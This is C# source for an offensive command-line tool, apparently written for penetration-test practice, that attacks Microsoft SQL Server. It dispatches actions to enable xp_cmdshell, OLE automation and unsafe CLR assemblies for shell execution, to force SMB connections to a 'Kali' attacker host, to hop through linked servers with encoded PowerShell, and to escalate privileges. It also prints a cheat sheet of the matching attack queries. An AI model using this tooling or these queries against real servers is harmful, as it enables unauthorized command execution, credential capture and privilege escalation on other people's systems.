using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Reflection;
using System.Runtime.InteropServices;

namespace sqlexec
{
    // dll exec not working?
    internal class Program
    {
        static void Main(string[] args)
        {
            string sqlServer = null;
            string port = "1433";
            string sqlContext = null;
            string database = null;
            string action = null;
            string username = null;
            string password = null;
            string linkedServer = null;
            string kali = null;
            string impersonate = null;
            string intsec = "True";
            Boolean help = false;
            Boolean queries = false ;

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "-s":
                        if (i + 1 < args.Length) sqlServer = args[++i];
                        break;
                    case "-c":
                        if (i + 1 < args.Length) sqlContext = args[++i];
                        break;
                    case "-d":
                        if (i + 1 < args.Length) database = args[++i];
                        break;
                    case "-a":
                        if (i + 1 < args.Length) action = args[++i];
                        break;
                    case "-u":
                        if (i + 1 < args.Length) username = args[++i];
                        break;
                    case "-p":
                        if (i + 1 < args.Length) password = args[++i];
                        break;
                    case "-l":
                        if (i + 1 < args.Length) linkedServer = args[++i];
                        break;
                    case "-k":
                        if (i + 1 < args.Length) kali = args[++i];
                        break;
                    case "-i":
                        if (i + 1 < args.Length) impersonate = args[++i];
                        break;
                    case "-n":
                        if (i + 1 < args.Length) port = args[++i];
                        break;
                    case "-h":
                        if (i + 1 < args.Length) help = true;
                        break;
                    case "-q":
                        if (i + 1 < args.Length) queries = true;
                        break;
                    case "-m":
                        if (i + 1 < args.Length) intsec = args[++i];
                        break;
                }
            }

            if (queries == true)
            {
                Console.WriteLine("Server = sqlServer,1433; Database = master; User Id = admin; Password = P@ssw0rd; Integrated Security = True;");
                Console.WriteLine("SELECT SYSTEM_USER;");
                Console.WriteLine("SELECT USER_NAME;");
                Console.WriteLine("SELECT IS_SRVROLEMEMBER('public');");
                Console.WriteLine("SELECT IS_SRVROLEMEMBER('sysadmin');");
                Console.WriteLine("EXEC master..xp_dirtree \"\\\\kali.local\\\\upi\"");
                Console.WriteLine("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'");
                Console.WriteLine("EXEC sp_linkedservers;");
                Console.WriteLine("EXECUTE AS LOGIN = 'sa';");
                Console.WriteLine("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell whoami");
                Console.WriteLine("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"ping kali.local\"';");
                Console.WriteLine("use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE; CREATE ASSEMBLY myAssembly FROM 'c:\\tools\\cmdExec.dll' WITH PERMISSION_SET = UNSAFE; CREATE PROCEDURE[dbo].[cmdExec] @execCommand NVARCHAR(4000) AS EXTERNAL NAME[myAssembly].[StoredProcedures].[cmdExec]; EXEC cmdExec 'whoami';");
                Console.WriteLine("use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE; CREATE ASSEMBLY my_assembly FROM 0x4D5A900..... WITH PERMISSION_SET = UNSAFE; CREATE PROCEDURE[dbo].[cmdExec] @execCommand NVARCHAR(4000) AS EXTERNAL NAME[myAssembly].[StoredProcedures].[cmdExec]; EXEC cmdExec 'whoami';");
                Console.WriteLine("EXEC('cmd') AT [linkedServer];");
                Console.WriteLine("EXEC('EXEC master..xp_dirtree \"\\\\kali.local\\\\upi\";') AT [linkedServer]);");
                Console.WriteLine("EXEC('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT[linkedServer]; EXEC('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT[linkedServer]; EXEC('xp_cmdshell ''powershell -nop -ep bypass -enc encodedCmd'';') AT[linkedServer]");
                Console.WriteLine("EXEC('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [linkedServer]') AT [sqlServer]; EXEC('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [linkedServer]') AT [sqlServer]; EXEC(' EXEC (''xp_cmdshell ''''powershell -nop -ep bypass -enc encodedCmd'''';'') AT linkedServer') AT sqlServer");

                return;
            }
            else if (help == true || (string.IsNullOrEmpty(sqlServer) || string.IsNullOrEmpty(database) || string.IsNullOrEmpty(action) || string.IsNullOrEmpty(sqlContext)))
            {
                Console.WriteLine("\nUsage: sqlexec -s <sqlServer> -c <sqlContext> -d <database>  -a <action>");
                Console.WriteLine("Optional: [-l <linkedserver> -k <kali IP> -i <impersonate> -u <username> -p <password> -n <port>]");
                Console.WriteLine("Optional: [-h <show help> -q <show usefull queries>");
                Console.WriteLine("\nExample: .\\sqlexec.exe -s server1 -c linked -d master -a user");
                Console.WriteLine("\nActions for local Sql context:");
                Console.WriteLine("  user          : Show the current user and roles");
                Console.WriteLine("  version       : Show the SQL Version");
                Console.WriteLine("  hostname      : Show the servername");
                Console.WriteLine("  query         : Start an SQL interactive session ");
                Console.WriteLine("  uncpathinj    : Perform a SMB connection");
                Console.WriteLine("  linkedservers : Show the linked servers");
                Console.WriteLine("  enableshell   : Enable the local server for shell execution (xp_cmdshell)");
                Console.WriteLine("  enableole     : Enable the local server for shell execution (Ole Automation)");
                Console.WriteLine("  enableassem   : Enable the local server for shell execution (assembly/.DLL)");
                Console.WriteLine("  execshell     : Start an CMD interactive session, enableshell require");
                Console.WriteLine("  execole       : Start an CMD interactive session, enableole require");
                Console.WriteLine("  execassem     : Start an CMD interactive session, enableasssem require");
                Console.WriteLine("\nActions for linked Sql context:");
                Console.WriteLine("  user          : Show the user and as whom we connect to the linked server");
                Console.WriteLine("  version       : Show the SQL version of the linked servers");
                Console.WriteLine("  hostname      : Show the servernamesof the linked servers");
                Console.WriteLine("  query         : Enabling the linked servers for shell execution");
                Console.WriteLine("  uncpathinj    : Perform a SMB connection");
                Console.WriteLine("  enable        : Enable the linked server for shell execution (xp_cmdshell)");
                Console.WriteLine("  shell         : Start an PS Enc interactive session, enable required");
                Console.WriteLine("  privenable    : Enable local privesc through a linked server");
                Console.WriteLine("  privesc       : Perform local privesc through a linked server");

                return;
            }
            else if (sqlContext == "linked" && string.IsNullOrEmpty(linkedServer))
            {
                Console.WriteLine("The Sql context 'Linked' needs a linkedserver (-l)");
                return;
            }
            else if (action == "uncpathinj" && string.IsNullOrEmpty(kali))
            {
                Console.WriteLine("The action uncpathinj needs Kali's IP (-k)");
                return;
            }
            else if (sqlContext != "local" && sqlContext != "linked")
            {
                Console.WriteLine("Invalid Sql context, options: local or linked.");
                return;
            }

            SqlConnection con = AuthSql(sqlServer, port, database, username, password, intsec);
            if (sqlContext == "local")
            {
                if (action == "user")
                {
                    LocalSqlOperations.User(con);
                }
                else if (action == "version")
                {
                    LocalSqlOperations.Version(con, impersonate);
                }
                else if (action == "hostname")
                {
                    LocalSqlOperations.Hostname(con, impersonate);
                }
                else if (action == "query")
                {
                    LocalSqlOperations.Query(con, impersonate);
                }
                else if (action == "uncpathinj")
                {
                    LocalSqlOperations.UncPathInj(con, impersonate, kali);
                }
                else if (action == "linkedservers")
                {
                    LocalSqlOperations.LinkedServers(con, impersonate);
                }
                else if (action == "enableshell")
                {
                    LocalSqlOperations.EnableShell(con, impersonate);
                }
                else if (action == "enableole")
                {
                    LocalSqlOperations.EnableOle(con, impersonate);
                }
                else if (action == "enableassem")
                {
                    LocalSqlOperations.EnableAssem(con, impersonate);
                }
                else if (action == "execshell")
                {
                    LocalSqlOperations.ExecShell(con, impersonate);
                }
                else if (action == "execole")
                {
                    LocalSqlOperations.ExecOle(con, impersonate);
                }
                else if (action == "execassem")
                {
                    LocalSqlOperations.ExecAssem(con, impersonate);
                }
                else
                {
                    Console.WriteLine("Invalid action to perform...");
                    return;
                }
            }
            else if (sqlContext == "linked")
            {
                if (action == "user")
                {
                    LinkedSqlOperations.User(con, linkedServer, impersonate);
                }
                else if (action == "version")
                {
                    LinkedSqlOperations.Version(con, linkedServer, impersonate);
                }
                else if (action == "hostname")
                {
                    LinkedSqlOperations.Hostname(con, linkedServer, impersonate);
                }
                else if (action == "query")
                {
                    LinkedSqlOperations.Query(con, linkedServer, impersonate);
                }
                else if (action == "uncpathinj")
                { 
                    LinkedSqlOperations.UncPathInj(con, linkedServer, impersonate, kali);
                }
                else if (action == "enable")
                {
                    LinkedSqlOperations.Enable(con, linkedServer, impersonate);
                }
                else if (action == "shell")
                {
                    LinkedSqlOperations.Shell(con, linkedServer, impersonate);
                }
                else if (action == "privenable")
                {
                    LinkedSqlOperations.PrivEnable(con, linkedServer, sqlServer, impersonate);
                }
                else if (action == "privesc")
                {
                    LinkedSqlOperations.PrivEsc(con, linkedServer, sqlServer, impersonate);
                }
                else
                {
                    Console.WriteLine("Invalid action to perform...");
                    return;
                }
            }
            else
            {
                Console.WriteLine("Something went wrong?");
                return;
            }

            con.Close();
            return;
        }
        public static SqlConnection AuthSql(string sqlServer, string port, string database, string username, string password, string intsec)
        {
            string conString = null;
            if (string.IsNullOrEmpty(username) && string.IsNullOrEmpty(password))
            {
                conString = $"Server={sqlServer},{port}; Database={database}; Integrated Security=True;";
            }
            else if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
            {
                throw new ArgumentException("Missing username or password...");
            }
            else
            {
                conString = $"Server={sqlServer}; Database={database}; User Id={username}; Password={password}; Integrated Security={intsec};";
            }

            SqlConnection con = new SqlConnection(conString);
            try
            {
                Console.WriteLine($"\nSQL Query: {conString}");
                con.Open();
                return con;
            }
            catch (Exception ex)
            {
                throw new ArgumentException("Auth failed: " + ex.Message);
            }
        }
    }
}
